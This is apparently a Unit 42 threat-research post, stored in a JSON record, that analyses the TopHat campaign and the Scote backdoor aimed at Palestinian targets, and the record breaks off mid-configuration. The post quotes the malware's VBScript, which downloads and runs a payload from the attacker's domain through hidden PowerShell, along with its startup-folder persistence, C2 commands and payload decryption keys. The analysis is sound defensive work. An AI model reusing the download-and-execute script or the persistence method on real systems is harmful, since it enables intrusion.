{
    "id": "7ff3e636-c41f-4974-ae08-f7c8fe2857d4",
    "created_at": "2022-10-25T16:48:20.843121Z",
    "updated_at": "2025-03-27T02:06:08.607117Z",
    "deleted_at": null,
    "sha1_hash": "8c10db53c54a7b7fd8644cfd7e2bc8da4edb4d37",
    "title": "",
    "authors": "",
    "file_creation_date": "2018-01-31T04:27:50Z",
    "file_modification_date": "2018-01-31T04:27:50Z",
    "file_size": 2610846,
    "plain_text": "[Blog Home (https://researchcenter.paloaltonetworks.com/) > Unit 42 (https://researchcenter.paloaltonetworks.com/unit42/)](https://researchcenter.paloaltonetworks.com/)\n\n- The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services\n# The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services\n\n[By Josh Grunzweig (https://researchcenter.paloaltonetworks.com/author/josh-grunzweig/)](https://researchcenter.paloaltonetworks.com/author/josh-grunzweig/)\nJanuary 26, 2018 at 5:00 AM\n[Category: Unit 42 (https://researchcenter.paloaltonetworks.com/unit42/)](https://researchcenter.paloaltonetworks.com/unit42/)\n[Tags: Core (https://researchcenter.paloaltonetworks.com/tag/core/), DustySky](https://researchcenter.paloaltonetworks.com/tag/core/)\n(https://researchcenter.paloaltonetworks.com/tag/dustysky/), Palestinian Territories\n(https://researchcenter.paloaltonetworks.com/tag/palestinian-territories/), Scote\n[(https://researchcenter.paloaltonetworks.com/tag/scote/), TopHat (https://researchcenter.paloaltonetworks.com/tag/tophat/)](https://researchcenter.paloaltonetworks.com/tag/tophat/)\n\n 7,454 (4)\n\n(https://twitter.com/home?\nstatus=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-the-tophat-campaign[attacks-within-the-middle-east-region-using-popular-third-party-](https://twitter.com/home?status=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services%2F+The+TopHat+Campaign%3A+Attacks+Within+The+Middle+East+Region+Using+Popular+Third-Party+Services)\nservices%2F+The+TopHat+Campaign%3A+Attacks+Within+The+Middle+East+Region+Using+Popular+ThirdParty+Services)  (https://www.facebook.com/sharer/sharer.php?\n[u=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-the-tophat-campaign-](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services%2F)\nattacks-within-the-middle-east-region-using-popular-third-party-services%2F) \n(https://www.linkedin.com/shareArticle?\nmini=true&url=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-the-tophatcampaign-attacks-within-the-middle-east-region-using-popular-third-partyservices%2F&title=The+TopHat+Campaign%3A+Attacks+Within+The+Middle+East+Region+Using+Popular+ThirdParty+Services&summary=&source=) [(//www.reddit.com/submit)](https://www.reddit.com/submit)\n\n### Summary\n\nIn recent months, Palo Alto Networks Unit 42 observed a wave of attacks leveraging popular third-party services Google+,\nPastebin, and bit.ly. Attackers used Arabic language decoy documents related to current events within the Palestine\nTerritories as lures to entice victims to open and subsequently be infected by the malware. There is data indicating that\nthese attacks are targeting individuals or organizations within the Palestinian Territories, which is detailed later.\n\nThe attacks themselves are deployed via four different means, two involving malicious RTF files, one involving selfextracting Windows executables, and the final using RAR archives.\n\nThe ultimate payload is a new malware family that we have dubbed “Scote” based on strings we found within the malware\nsamples. Scote provides backdoor access for an attacker and we have observed it collecting command and control (C2)\ninformation from Pastebin links as well as Google+ profiles. The bit.ly links obscured the C2 URLs so victims could not\nevaluate the legitimacy of the final site prior to clicking it. We are calling their recent activity the “TopHat” campaign.\n\nAdditionally, we tracked the apparent author testing their malware against numerous security products. Our tracking of this\ntesting enabled us to both note changes made over time as well as to observe other malware being submitted by the author.\nThis other malware submitted provided overlaps with the previously reported DustySky campaign\n(http://www.clearskysec.com/dustysky/). In addition to testing malicious RTFs that deploy the Scote malware family, the\nsame attacker was witnessed submitting files that appear to be new variants of the DustySky Core malware discussed in\ntheir report.\n\n### Malware Delivery Techniques\n\nThe attacks we found within the TopHat campaign began in early September 2017. In a few instances, original filenames of\nthe identified samples were written in Arabic. Specifically, we found the following names during this investigation:\n\n**Original Filename** **Translation**\n\n\n-----\n\n|ﺍﻟﺳﻠﻁﺔ ﺑﺣﻝ ﻳﺑﺩﺍ ﺍﻟﺭﺋﻳﺱ.rar|The president begins dissolving power.rar|\n|---|---|\n|ﺔﻁﻠﺳﻟﺍ ﻝﺣﺑ ﺍﺩﺑﻳ ﺱﻳﺋﺭﻟﺍ.scr|The president begins dissolving power.scr|\n|ﻡﻭﻳﻟﺍ ﻉﺎﻣﺗﺟﺍ ﺭﺿﺣﻣ.doc|Minutes of today’s meeting.doc|\n\n\nWe observed a series of techniques used to deploy the Scote malware family. To date, at a high level, we have observed the\nfollowing four techniques, each of which we delve into in this blog:\n\n(https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_1.png)\n\n_Figure 1 Malware delivery techniques_\n\n### Technique #1 – RTFs Leveraging Bit.ly\n\nThe first technique encountered included the use of malicious RTFs that made a HTTP request to the below URL which then\nredirected to the below malicious site (note the intentional typo of “storage”):\n\n**URL** **Redirect**\n\nhttp://bit[.]ly/2y3XL3P http://storgemydata[.]website/v.dat\n\nThis ‘v.dat’ file was in turn a PE32 executable file that has the following SHA256 hash:\n\nSHA256 862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d5\n\nLooking at the publicly available statistics for the bit[.]ly redirect, we see the majority of activity taking place in late October\nof this year. Additionally, we see the majority of the downloads originating from both the Palestinian Territories as well as the\nUnited Arab Emirates. This provides clues as to who the victims are or where attackers may originate from.\n\n|URL|Redirect|\n|---|---|\n|http://bit[.]ly/2y3XL3P|http://storgemydata[.]website/v.dat|\n\n|SHA256|862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d5|\n|---|---|\n\n\n-----\n\n(https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_2.png)\n\n_Figure 2 Statistics surrounding malicious redirect_\n\n### Technique #2 – Don’t Kill My Cat Attacks\n\nThe second technique uses an interesting tactic that Unit 42 has not seen before. Specifically, it makes use of an attack\ndiscussed in July of this year called Don’t Kill My Cat or DKMC. DKMC can enable an attacker to load a legitimate bitmap\n(BMP) file that contains shellcode within it. The DKMC tool and more information about this tactic may be found here\n(https://github.com/Mr-Un1k0d3r/DKMC).\n\nThis specific attack begins with a malicious executable file that downloads a legitimate BMP file that looks like the following:\n\n_Figure 3 Malicious BMP image retrieved by downloader_\n\nIt should be noted that this is the same image used in the DKMC presentation. It would appear that the attackers simply\nused the default settings of this particular program.\n\nThis BMP file is loaded as shellcode. The first six bytes are read as the following instructions:\n\n\n1\n2\n3\n\n\nseg000:00000000 inc   edx\nseg000:00000001 dec   ebp\nseg000:00000002 jmp   loc_34D8B\n\n\nCode execution is then redirected to embedded shellcode.\n\nThe underlying shellcode is decrypted at runtime using a 4-byte XOR key of 0x3C0922F0. The shellcode eventually loads an\nembedded UPX-packed executable and redirects execution to this file. This file is an instance of the Scote malware family.\n\n\n-----\n\ng, y p\n\n### Technique #3 – RTFs Exploiting CVE-2017-0199.\n\nThis technique begins with malicious RTF files that make use of CVE-2017-0199 (https://portal.msrc.microsoft.com/enUS/security-guidance/advisory/CVE-2017-0199) a Microsoft Office/WordPad remote code execution (RCE) vulnerability\npatched by Microsoft in September 2017. When opened, the following lure is displayed to the victim (translation on the right\nprovided by Google Translate):\n\n(https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_4.png)\n\n_Figure 4 Lure used by malicious RTFs_\n\nThis lure is related to an event reported (http://indianexpress.com/article/world/palestinians-to-turn-presidential-palace-intonational-library-4816384/)in late August where President Mahmoud Abbas announced plans to convert a planned\npresidential palace into a national library. This is consistent with the timeline of the attacks we witnessed, as the event took\nplace roughly a week before we observed these malware samples.\n\nThese RTFs will also download a file from the following location:\n\nstorgemydata[.]website/update-online/office-update.rtf\n\nNote that this is the same domain witnessed in the redirect used in technique #1. While the downloaded file has an RTF\nextension, it is in fact a VBScript with the following contents:\n\n\n1\n2\n3\n4\n5\n6\n\n7\n8\n9\n\n\n<script language=\"VBScript\">\nwindow.moveTo -4000, -4000\nSet vFwhEtGt = CreateObject(\"Wscript.Shell\")\nSet lfTi = CreateObject(\"Scripting.FileSystemObject\")\nIf 1=1 Then\nvFwhEtGt.Run (\"PowerShell.exe -WindowStyle Hidden $d=$env:userprofile+'\\\\start Menu\\\\Programs\\\\Startup\\\\\\1233071870\n1ac441736a55e3ee3cx996.exe';(New-Object System.Net.WebClient).DownloadFile('http://storgemydata[.]website/x.exe',$d);St\nart-Process $d;\"),0\nEnd If\nwindow.close()\n</script>\n\n\nThis VBScript script executes a PowerShell command that will download and execute a file from the following location:\n\nhttp://storgemydata[.]website/x.exe\n\nThis final ‘x.exe’ executable file is an instance of the Scote malware family.\n\n### Technique #4 – Self-extracting Executables\n\nThe last technique makes use of self-extracting executable files to both load a decoy document and spawn an instance of\nScote. When the malware is run it will drop a file with an original filename of ‘abbas.rtf’, which contains the following\ncontents:\n\n\n-----\n\n(https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_5.png)\n\n_Figure 5 TopHat decoy document with rough translation_\n\nAdditionally, an instance of Scote is loaded on the victim machine.\n\nThe decoy document used discusses the potential dissolving of the Palestinian Authority (PA) by the President Mahmoud\nAbbas. This particular event was reported (https://www.middleeastmonitor.com/20170823-abbas-considers-option-ofdissolving-pa-and-switching-power-to-plo/)on August 23, 2017, just before Trump administration officials were set to visit\nRamallah.\n\nLater in this blog, we will see the attackers leveraging this Donald Trump connection even more.\n\nWe originally witnessed these specific RTFs on September 6, 2017, just two weeks after this event.th\n\nBased on the observed statistics from the malicious redirect found in technique #1, as well as the content of this decoy\ndocument, we can infer that at least some of the targeted victims may very well be located in the Palestinian Territories.\n\n### Analysis of the Scote Malware\n\nThe Scote malware family employs a series of techniques and tricks when it is originally loaded onto a victim machine.\nHowever, underneath the various layers of obfuscation lies a fairly straightforward malware family that abuses legitimate\nthird-party online services to host its C2 information.\n\nWhen Scote originally is run, it will decode embedded configuration information. This embedded configuration information\ncontains URLs to third party online services, such as Pastebin postings or Google+ accounts. Scote will use this information\nto attempt to retrieve data from these URLS and parse it, such as in the following example:\n\n_Figure 6 Google+ profile used by Scote malware_\n\n\n-----\n\np g g p g y p\ncampaign, many of which also referred to the President of the Palestinian Territories.\n\nAfter C2 information is retrieved by Scote, it will communicate with these servers and can accept commands that perform\nthe following actions:\n\nKill the Scote malware\nRun ‘ipconfig’ on the victim and return results\nRun ‘cmd.exe /C systeminfo’ and return results\nLoad a DLL that is downloaded from a C2\n\nFor more information about the Scote malware family, please refer to the Appendix.\n\n### Identified Malware Testing Against Security Solutions\n\nWhen looking at the malicious RTF documents in technique #4 that exploit CVE-2017-0199 we found that all of the files we\nencountered were submitted within close succession of each other to an online service that tests them against multiple\nsecurity products. Additionally, the original filenames of these files implied that an attacker may have been testing their\nmalware against one or more security products.\n\n**SHA256** **Filename Date**\n\ncb6cf34853351ba62d4dd2c609d6a41c618881670d5652ffa7ddf5496e4693f0 test1.rtf 201709-06\n15:00:08\nUTC\n\n8a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf64 xx.rtf 201709-06\n15:00:53\nUTC\n\nd302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b5 xx2.rtf 201709-06\n15:01:49\nUTC\n\n1cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a1 xx2.rtf 201709-06\n15:05:30\nUTC\n\nd409d26cffe6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9 xx2.rtf 201709-06\n15:08:32\nUTC\n\naa18b8175f68e8eefa12cd2033368bc1b73ff7caf05b405f6ff1e09ef812803c xx2.rtf 201709-06\n15:18:14\nUTC\n\nAs we can see by the timestamps shown above, the files were submitted anywhere from one to ten minutes apart from each\nother. Looking closer at these files we can see what changed between iterations.\n\n|SHA256|Filename|Date|\n|---|---|---|\n|cb6cf34853351ba62d4dd2c609d6a41c618881670d5652ffa7ddf5496e4693f0|test1.rtf|2017- 09-06 15:00:08 UTC|\n|8a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf64|xx.rtf|2017- 09-06 15:00:53 UTC|\n|d302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b5|xx2.rtf|2017- 09-06 15:01:49 UTC|\n|1cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a1|xx2.rtf|2017- 09-06 15:05:30 UTC|\n|d409d26cffe6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9|xx2.rtf|2017- 09-06 15:08:32 UTC|\n|aa18b8175f68e8eefa12cd2033368bc1b73ff7caf05b405f6ff1e09ef812803c|xx2.rtf|2017- 09-06 15:18:14 UTC|\n\n\n-----\n\n(https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_7.png)\n\n_Figure 7 Modifications made to RTFs by attacker_\n\nAs it so happens, the first RTF file this attacker attempted to test had very few detections. However, this was due to the fact\nthat the attempts at commenting out the backslashes caused this file to not open at all within Microsoft Word. When you\nattempt to open this file, Word will simply render the content as it would a normal text file.\n\nIt appeared that the attacker realized this, as he or she quickly corrected this, and proceeded to make very minor\nmodifications to try and evade security products. However, none of the modifications were terribly effective: all of these\nsamples were found to have a high rate of detection.\n\nAs we can see in Figure 7, the attacker made multiple very small modifications between each iteration, specifically around\nthe ‘⧵object⧵objlink⧵objupdate’ string. This particular control allows the malicious content to be loaded by the RTF, as\n[outlined in an analysis by MDSec (https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/).](https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/)\nAs such, the attacker likely felt this was what resulted in the RTF being detected as malicious, and attempted to obfuscated\nit.\n\n### Overlap with the DustySky Campaign\n\nBesides being able to witness the attacker testing his or her malware, we noticed something interesting when we were\nlooking at the individual who submitted these files. About a month and a half after these files were submitted, the same\n[individual submitted the following three samples that we attribute to the DustySky (http://www.clearskysec.com/dustysky/)](http://www.clearskysec.com/dustysky/)\ncampaign:\n\n202d1d51254eb13c64d143c387a87c5e7ce97ba3dcfd12dd202a640439a9ea3b\nd18e09debde4748163efa25817b197f3ff0414d2255f401b625067669e8e571e\n3e4d0ffdde0b5db2a0a526730ff63908cefc9634f07ec027c478c123912554bb\n\nDustySky is a campaign published by ClearSky in January 2016 that discusses a politically motivated group that primarily\ntargets organizations within the Middle East. The group has remained active since they were originally reported on, including\na campaign identified by Unit 42 earlier this year (https://researchcenter.paloaltonetworks.com/2017/01/unit42-downeksand-quasar-rat-used-in-recent-targeted-attacks-against-governments/). These files appear to be new variants of the\nDustySky Core malware discussed in the report and they communicate with the following domains over HTTPS:\n\nfulltext.yourtrap[.]com\nchecktest.www1[.]biz\n\nThe malware is dropped via a self-extracting executable, which contains an empty decoy document with the following\nname:\n\n\n-----\n\nNews of the detention of President Abbas in Saudi Arabia and Dahlan’s declaration as President of Palestine.docx\n\nAs we can see, the name of this decoy document is consistent with the lures witnessed in the TopHat campaign.\n\n### Conclusion\n\nAttackers often are found to leverage current events to accomplish their goal. In the TopHat campaign, we have observed\nyet another instance where a threat actor looks to be using political events to target individuals or organizations within the\nPalestine region. This campaign leveraged multiple methods to deploy a previously unseen malware family, including some\nrelatively new tactics in the case of using a legitimate BMP file to load malicious shellcode.\n\nThe new malware family, which we have dubbed Scote, employs various tricks and tactics to evade detection, but provides\nrelatively little functionality to the attackers once deployed. This may well be due to the fact it is still under active\ndevelopment. Scote uses some interesting methods when retrieving C2 information, including the use of Pastebin and\nGoogle+ accounts, as well as using bit.ly links to obscure the C2 URLs so victims could not evaluate the legitimacy of the\nfinal site prior to clicking it.\n\nThe TopHat campaign was found to have some overlaps discovered with the previously reported DustySky campaign when\nthe attacker was identified to be submitting their files for testing purposes. Unit 42 will continue to track and monitor this\nthreat and will report on any developments that occur.\n\nPalo Alto Networks customers are protected by this threat in the following ways:\n\n[The Scote (https://autofocus.paloaltonetworks.com/#/tag/Unit42.Scote) malware family and the TopHat](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Scote)\n(https://autofocus.paloaltonetworks.com/#/tag/Unit42.TopHat) campaign have been tagged within AutoFocus for\ncontinued tracking\n[DustySky (https://autofocus.paloaltonetworks.com/#/tag/Unit42.DustySky) is tagged within AutoFocus for ongoing](https://autofocus.paloaltonetworks.com/#/tag/Unit42.DustySky)\ntracking\nAll malicious domains discovered within this campaign have been appropriately flagged as malware\nAll samples are marked malicious within WildFire\nTraps identifies and blocks the exploits used by the RTF files\n\nAdditionally, Google, Pastebin, and bit.ly have been notified of the malicious content being hosted on their services.\n\n### Appendix Indicators of Compromise\n\n**SHA256 Hashes**\n\nd3ead67228b3d7968ac767648b46a8e906affa0ebb5cc69f7acbed475a97204c\n\n03e2b932c013252fa2eb5e35390f9e21d0ff87e5b1c01683ebce0e8ce9b8d6df\n\n4df9488fbdfaf5d05fda65175a6b6e5331c58c967adbe972aa46c64b4fd0b1bb\n\n0dde9940f7896c2e4fb881dd185c3c3db280a9fd2ac2cb81988f43f5b0f6fcf7\n\n613da5f745c281acbffa4375e96394f8c912f58f92afe347e8a1f10fad3489bb\n\nd0f2d2d7d82c91fe64a64552e0e6200a096230fb6a64a1307928ae33ab2a5bf8\n\n7b6347093b27174e27228c2fde7d39e02d57315b354461aaf1dee3f0800fdfc3\n\nbdc633fe3145d87036ad759be855771d5bb3ca592cecca9ef7f41454d7cf9f05\n\ned9c62f77055a2498aec681b5653240be534595b97a9d11e92371639b0ca9a48\n\n7a1fa34ca804492415579c3ed4f505a7f09fcd7bc834590cff86e2ce77c4fc73\n\n862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d5\n\n3540c2f0765773fa0a822fcf5fed5ed2a363ad11291a66ab1b488c9a4aa857f9\n\nddc13c8d3d55562df873d4cf17181164922cb71d0c94edeb8fa143033c1214e0\n\nd4cb6b76dd352c928ca7184f583d14d800c090ba650dd26d8fa4febe901d1205\n\n5c0b253966befd57f4d22548f01116ffa367d027f162514c1b043a747bead596\n\n\n-----\n\naa18b8175f68e8eefa12cd2033368bc1b73ff7caf05b405f6ff1e09ef812803c\n\nd409d26cffe6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9\n\nd302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b5\n\n1cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a1\n\n8a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf64\n\n3627ed71588c7b55b35592c3b277910041f3d5ff917de721c53684ee18fcda40\n\n109996d28700fa0e8594d6ecca422418fa43e1b7cf5f9f4442a69264bf5fcea4\n\nc2815c72c9ea70db073775269ef04b1d061e93580f0f5fd3f3de25601641576a\n\n**Domains**\n\nstorgemydata[.]website\n\n### Scote Technical Analysis\n\nFor the technical analysis, we used the following sample:\n\nSHA256 3540c2f0765773fa0a822fcf5fed5ed2a363ad11291a66ab1b488c9a4aa857f9\n\nThis particular sample begins as a self-extracting executable. When run, it will drop a ‘e.exe’ sample and execute the\nfollowing SFX script commands:\n\n|SHA256|3540c2f0765773fa0a822fcf5fed5ed2a363ad11291a66ab1b488c9a4aa857f9|\n|---|---|\n\n\n1\n2\n3\n4\n5\n\n\nPath=%userprofile%\\start menu\\programs\\startup\\\nSetup=e.exe\nSilent=1\nOverwrite=1\nUpdate=U\n\n\nFor those unfamiliar with SFX commands, the series of commands above is silently deploying e.exe to the startup path. It\nwill overwrite any instances where e.exe already exists in this path.\n\nThe ‘e.exe’ file is compiled in Delphi and has the following SHA256 hash:\n\nSHA256 9580d15a06cd59c01c59bca81fa0ca8229f410b264a38538453f7d97bfb315e7\n\nWhen run, ‘e.exe’ will periodically decrypt strings at runtime using a simple single-byte XOR routine. While the routine allows\nfor different bytes to be used, the author chose to use a key of 0xFF in every observed instance.\n\nThe malware proceeds to get the address of the NtDelayExecution function from ntdll.dll. This function is used by Sleep to\ncause a delay in program execution. After this function address has been resolved, it will overwrite the first five bytes to jmp\nto a malicious function, as seen below:\n\n_Figure 8 Modifications to NtDelayExeuction_\n\nThe malware proceeds to make a call to Sleep with an argument of 1, thus redirecting execution to this malicious function.\nThis is likely an attempt at thwarting anti-virus and security solutions, however, has the adverse effect of preventing the\nmalware from making subsequent calls to Sleep.\n\n|SHA256|9580d15a06cd59c01c59bca81fa0ca8229f410b264a38538453f7d97bfb315e7|\n|---|---|\n\n\n-----\n\nZwAllocateVirtualMemory\nZwWriteVirtualMemory\nZwGetContextThread\nZwSetContextThread\nZwResumeThread\n\nA large blob of encrypted data is decrypted using a modified version of RC4. The following Python code may be used to\ndecrypt this data. The key has consistently been observed to be “qlNwuFVA9K8HpGNY6x0I”.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\nimport base64\nimport binascii\nimport hexdump\nimport sys\n\ndef rc4_crypt(data, key):\nS = range(256)\nj = 0\nout = []\nfor i in range(256):\nj = (j + S[i] + ord( key[i % len(key)] )) % 256\nS[i], S[j] = S[j], S[i]\n\ni = 0\nfor char in data:\nj = (S[i % 256] + j) % 256\nt = S[i%256]\nS[i%256] = S[j]\nS[j] = t\nout.append(chr(ord(char) ^ S[(S[i%256] + S[j]) % 256]))\ni += 1\nreturn ''.join(out)\n\nfile = sys.argv[1]\nf = open(file, 'rb')\nfd = f.read()\nf.close()\n\noutput = rc4_crypt(fd, \"qlNwuFVA9K8HpGNY6x0I\")\n\nf = open(\"decrypted_data.bin\",'wb')\nf.write(output)\nf.close()\n\n\nThis decrypted code is then copied to a newly allocated block of memory before execution flow is redirected to it. When this\nnewly decrypted code is called, it is provided with a string argument containing the path to svchost.exe.\n\nThis new code is shellcode that will eventually decrypt an executable file and inject it into a newly spawned svchost.exe\nprocess.\n\nThe shellcode in question makes certain decisions by the author that demonstrates a lack of sophistication. For example, it\nwill load a series of libraries and functions using a common ROR13 technique. This technique begins with the attacker\ntaking a string of a library or function, such as ‘CreateProcessA’, and performing a binary ROR13 against it. In this example,\nthe attacker has a result of a DWORD of 0x16B3FE72. This DWORD is then typically hardcoded within the shellcode. The\nmalicious code then iterates through the functions of the necessary library and applies the same ROR13 technique against\neach function until it finds a match.\n\nThis shellcode uses the same approach, however, instead of providing the hardcoded DWORDs, it instead provides the\nclear-text library and function names, which then have the ROR13 applied. The resulting DWORD is then used.\nUnfortunately, this completely cancels out any obfuscation that might have originally been present.\n\nAfter the various libraries and functions are loaded, the shellcode decodes an embedded blob of data using a multi-byte\nXOR operation. The original key for this operation appears to have been ‘Houdini’, however, due to a likely mistake by the\nauthor, after the first iteration, a key of ‘oudini⧵x00’ is used instead.\n\nThe following example Python code decodes this data found within the shellcode:\n\n\n-----\n\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\ndef xor(message, key):\nreturn ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))\n\ndef decode(data, size):\nout = \"\"\nkey = \"oudini\\x00\"\nb1 = xor(data[0], \"H\")\nb2 = xor(data[1:size], key)\nb = b1 + b2\nfor bite in b:\nout += chr((ord(bite) + 128) & 0xff)\nreturn out\n\nfile = sys.argv[1]\nf = open(file, 'rb')\nfd = f.read()\nf.close()\n\nsize = 54272\noutput = decode(fd, size)\n\nf1 = \"embeddedShellcode.bin\"\nfh = open(f1, 'wb')\nfh.write(output)\nfh.close()\n\n\nThis decoded blob is a Microsoft Windows executable that contains the Scote payload. After this blob is decoded, a new\ninstance of svchost.exe is spawned in a suspended state. The Scote payload is injected into this process prior to resuming\nit.\n\nScote begins by loading and decoding an embedded resource string. It is decoded first using base64 with a customized\nalphabet. The result is then base64-decoded using the traditional alphabet. The following alphabet is used for the first phase\nof decoding:\n\n0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/\n\nOnce decoded, we’re provided with the following configuration (newlines and spacing added for presentation):\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n[config]\n\n[connection]\n\n[param]http://pastebin[.]com/raw/2cLsuXj6[/param]\n\n[param]http://pastebin[.]com/raw/trZZJTGA[/param]\n\n[/connection]\n\n[install_name]e3HGAiPJ[/install_name]\n\n[nick_name]4c1h7vLX[/nick_name]\n\n[install_folder]noinstall[/install_folder]\n\n[reg_startup]false[/reg_startup]\n\n[folder_startup]false[/folder_startup]\n\n[task_startup]false[/task_startup]\n\n[injection]true[/injection]\n\n[injection_process]svchost[/injection_process]\n\n\nThe configuration is parsed to determine if there are any connection ‘param’ parameters provided. In the event that there\nare, Scote will attempt to download the contents of these URLs via a simple GET request.\n\nThese pastebin URLs contained the following information, IPs have been defanged:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nscout{\n5.175.214[.]9:22\n5.175.214[.]9:23\n5.175.214[.]9:25\n5.175.214[.]9:53\n5.175.214[.]9:6000\n5.175.214[.]9:80\n}\nelite{\n5.175.214[.]9:5000\n5.175.214[.]9:443\n5.175.214[.]9:1434\n5.175.214[.]9:110\n5.175.214[.]9:2716\n5.175.214[.]9:8080\n}\n{x=c2NvdXR7DQo1LjE3NS4yMTQuOToyMg0KNS4xNzUuMjE0Ljk6MjMNCn0NCmVsaXRlew0KNS4xNzUuMjE0Ljk6NTAwMA0KNS4xNzUuMjE0Ljk6NDQzDQp\n9}\n\n\n-----\n\nhttps://plus.google[.]com/110228699051788231047\nhttps://plus.google[.]com/106456556287604120942\n\nScote takes the response from these requests and parses data within ‘scout{}’. Other Scote versions attempted to identify\ndata contained within ‘{x=’ and ‘}’. This data is decoded using the traditional Base64 algorithm. The results are similar to the\nfollowing (IPs have been defanged):\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nscout{\n5.175.214[.]9:22\n5.175.214[.]9:23\n}\nelite{\n5.175.214[.]9:5000\n5.175.214[.]9:443\n}\n\n\nThis information is used for subsequent communication and these values represent the Scote malware’s C2.\n\nWhile there are a number of other configuration parameters within Scote, the connection params and the nick_name appear\nto be the only ones used. It’s possible that Scote is still actively being developed and the author has yet to make use of the\nadditional parameters provided within the configuration. A full list of identified Scote configurations may be found within the\n‘Scote Configurations’ appendix.\n\nScote checks the current running process against the following list to ensure it is running within one of them:\n\nsvchost.exe\nexplorer.exe\nchrome.exe\nfirefox.exe\niexplorer.exe\nopera.exe\n\nScote makes an ASM call to CPUID with an argument of 1 to query the victim’s processor information and features. This\ninformation is used to generate a unique 8-character hash for that victim.\n\nScote then connects to the previously retrieved C2 servers and sends the following information via TCP:\n\ncommand=scote_connection|hwid=[8 character hash]\n\nIn the example above, [8 character hash] is replaced with the victim’s unique hash. Scote continues to submit the following\ncommand periodically and will parse the response:\n\ncommand=scote_ping\n\nScote accepts the following five responses:\n\n**Command** **Description**\n\nscote_pong No action taken by Scote\n\nscote_drop Kill the Scote malware\n\nscote_info_ipconfig Return the results of running ‘ipconfig’\n\nscote_info_systeminfo Return the results of running ‘cmd.exe /C\n\nsysteminfo’\n\nscote_upgrade Accept a DLL from the remote C2 and load it.\n\nWhen Scote returns information in the following format:\n\ncommand=[command]|buffer=[data]\n\nIn the example above, [command] is replaced with the command received by the remote C2 server, and [data] is replaced\nwith data that has been encoded using both traditional base64 as well as base64 with the nonstandard alphabet.\n### Scote Configurations\n\n|Command|Description|\n|---|---|\n|scote_pong|No action taken by Scote|\n|scote_drop|Kill the Scote malware|\n|scote_info_ipconfig|Return the results of running ‘ipconfig’|\n|scote_info_systeminfo|Return the results of running ‘cmd.exe /C systeminfo’|\n|scote_upgrade|Accept a DLL from the remote C2 and load it.|\n\n\n1\n2\n3\n4\n5\n\n\n4df9488fbdfaf5d05fda65175a6b6e5331c58c967adbe972aa46c64b4fd0b1bb\n\n[config]\n\n[connection]\n\n[param]https://plus google[ 